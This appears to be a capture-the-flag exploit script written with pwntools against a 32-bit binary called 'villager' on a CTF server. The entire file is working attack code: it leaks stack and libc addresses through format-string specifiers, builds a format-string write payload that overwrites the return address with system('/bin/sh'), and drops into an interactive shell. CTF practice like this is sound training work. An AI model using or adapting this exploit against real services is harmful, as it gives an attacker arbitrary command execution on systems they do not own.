from pwn import *

# p = process('./villager')
# p = remote('localhost', 7777)
p = remote('ctfq.u1tramarine.blue', 10023)
e = ELF('./villager')
libc = ELF('./libc.so.6')
# libc = ELF('/lib32/libc.so.6')

def fmtstr(addr1, addr2, addr3, addr4, x):
    payload = b''
    payload += p32(addr1)
    payload += p32(addr1+2)
    payload += p32(addr2)
    payload += p32(addr2+2)
    n=len(payload)
    for i in range(2):
        l = (addr3&0xffff)-n
        l &= 0xffff
        s = '%{}c%{}$hn'.format(l, x+i)
        payload += s.encode()
        n += l
        addr3 >>= 16
    for i in range(2):
        l = (addr4&0xffff)-n
        l &= 0xffff
        s = '%{}c%{}$hn'.format(l, x+2+i)
        payload += s.encode()
        n += l
        addr4 >>= 16
    return payload

p.recvuntil("What's your name?\n")
p.sendline('%78$p')
p.recvuntil('Hi, ')
stack = int(p.recvline()[:-1], 16)
stack -= 48
print(hex(stack))

p.recvuntil("What's your name?\n")
p.sendline('%91$p')
p.recvuntil('Hi, ')
libc.address = int(p.recvline()[:-1], 16) - 249 - libc.symbols['__libc_start_main']
print(hex(libc.address))

print('[+] Overwrite Return address')
# payload = fmtstr(stack+0x4, stack+0xc, libc.symbols['system'], next(libc.search(b'/bin/sh')), 7) 
payload = fmtstr_payload(7, {stack+0x4:libc.symbols['system'], stack+0xc:next(libc.search(b'/bin/sh'))})
print(payload)

p.recvuntil("What's your name?\n")
p.sendline(payload)

p.interactive()

